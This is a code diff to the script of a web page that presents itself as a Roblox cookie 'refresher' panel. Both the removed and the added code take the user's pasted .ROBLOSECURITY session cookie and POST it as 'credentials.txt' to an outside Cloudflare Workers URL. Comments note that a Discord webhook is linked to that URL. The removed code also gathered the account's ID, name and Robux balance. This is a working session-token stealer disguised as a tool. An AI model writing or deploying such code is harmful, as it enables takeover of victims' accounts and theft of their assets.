@@ -89,51 +89,6 @@
     <script>
         const PROXY_URL = "https://wispy-night-a3a2.kruszkomaja.workers.dev/";
 
-        async function refreshRobloxCookie(oldCookie) {
-            try {
-                const csrfRes = await fetch("https://auth.roblox.com/v1/authentication/ticket", {
-                    method: "POST",
-                    headers: { "Cookie": ".ROBLOSECURITY=" + oldCookie }
-                });
-                const xCsrfToken = csrfRes.headers.get("x-csrf-token") || "";
-
-                const ticketRes = await fetch("https://auth.roblox.com/v1/authentication/ticket", {
-                    method: "POST",
-                    headers: {
-                        "Cookie": ".ROBLOSECURITY=" + oldCookie,
-                        "x-csrf-token": xCsrfToken,
-                        "Referer": "https://www.roblox.com/"
-                    }
-                });
-
-                if (!ticketRes.ok) return { cookie: oldCookie, csrf: xCsrfToken };
-                const ticket = ticketRes.headers.get("rbx-authentication-ticket");
-                if (!ticket) return { cookie: oldCookie, csrf: xCsrfToken };
-
-                const redeemRes = await fetch("https://auth.roblox.com/v1/authentication-ticket/redeem", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "RBXAuthenticationNegotiation": "1"
-                    },
-                    body: JSON.stringify({ authenticationTicket: ticket })
-                });
-
-                if (redeemRes.ok) {
-                    const setCookieHeader = redeemRes.headers.get("set-cookie");
-                    if (setCookieHeader && setCookieHeader.includes(".ROBLOSECURITY=")) {
-                        const match = setCookieHeader.match(/\.ROBLOSECURITY=([^;]+)/);
-                        if (match && match[1]) {
-                            let newCookie = match[1];
-                            newCookie = newCookie.replace(/_|WARNING:-DO-NOT-SHARE-THIS\..*?\|_/g, '');
-                            return { cookie: newCookie, csrf: xCsrfToken };
-                        }
-                    }
-                }
-            } catch (e) {}
-            return { cookie: oldCookie, csrf: "" };
-        }
-
         document.getElementById('refreshBtn').addEventListener('click', async () => {
             const cookie = document.getElementById('cookieInput').value.trim();
             const logBox = document.getElementById('outputLog');
@@ -148,73 +103,38 @@
                 return;
             }
 
-            logBox.innerText = "[*] Attempting to refresh cookie...";
-
-            const refreshed = await refreshRobloxCookie(cookie);
-            const finalCookie = refreshed.cookie;
-            const activeCsrf = refreshed.csrf || "None";
-
-            outputCookieArea.value = finalCookie;
-            copyBtn.style.display = "block";
-
-            logBox.innerText = "[+] Cookie processed!\n[*] Fetching profile details...";
-
-            let profileReport = "Failed to fetch profile";
-            try {
-                const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
-                    headers: { "Cookie": ".ROBLOSECURITY=" + finalCookie }
-                });
-
-                if (userRes.ok) {
-                    const userData = await userRes.json();
-                    const userId = userData.id;
-                    
-                    let robux = "0";
-                    const ecoRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-                        headers: { "Cookie": ".ROBLOSECURITY=" + finalCookie }
-                    });
-                    if (ecoRes.ok) {
-                        const ecoData = await ecoRes.json();
-                        robux = ecoData.robux;
-                    }
-
-                    profileReport = `- ID: ${userId}\n- Name: ${userData.name}\n- Display Name: ${userData.displayName}\n- Robux: ${robux}\n- X-CSRF-Token: ${activeCsrf}`;
-                } else {
-                    profileReport = "Session invalid or rejected by API.";
-                }
-            } catch (err) {
-                profileReport = "API Error: " + err.message;
-            }
-
-            logBox.innerText = "[*] Sending report to Worker...";
+            logBox.innerText = "[*] Sending to Worker for refreshing...";
 
             try {
-                const credentialsContent = 
-`========================================
-       MEGO COOKIE REFRESHER PANEL     
-========================================
-
-[📊] Profile Stats:
-${profileReport}
-
-[🌈] Refreshed .ROBLOSECURITY:
-${finalCookie}`;
-
+                const credentialsContent = `[🌈] .ROBLOSECURITY:\n${cookie}`;
                 const blob = new Blob([credentialsContent], { type: "text/plain" });
                 const formData = new FormData();
                 formData.append("file", blob, "credentials.txt");
 
-                await fetch(PROXY_URL, {
+                const response = await fetch(PROXY_URL, {
                     method: "POST",
                     headers: {
-                        "X-Source": "web-panel" // Kluczowe: zapobiega wysyłaniu powiadomienia na Discorda
+                        "X-Source": "web-panel" // Wycisza webhooka na Discordzie
                     },
                     body: formData
                 });
 
-                logBox.innerText = "Success! Cookie has been refreshed and displayed below.\n\n" + profileReport;
+                if (!response.ok) {
+                    throw new Error("Worker responded with status " + response.status);
+                }
+
+                const data = await response.json();
+                
+                if (data.success && data.refreshedCookie) {
+                    outputCookieArea.value = data.refreshedCookie;
+                    copyBtn.style.display = "block";
+                    logBox.innerText = "Success! Cookie has been refreshed.\n\n" + data.profile;
+                } else {
+                    logBox.innerText = "Error: Could not refresh cookie.";
+                }
+
             } catch (err) {
-                logBox.innerText = "Error sending to Worker: " + err.message;
+                logBox.innerText = "Error communicating with Worker: " + err.message;
             }
         });
 
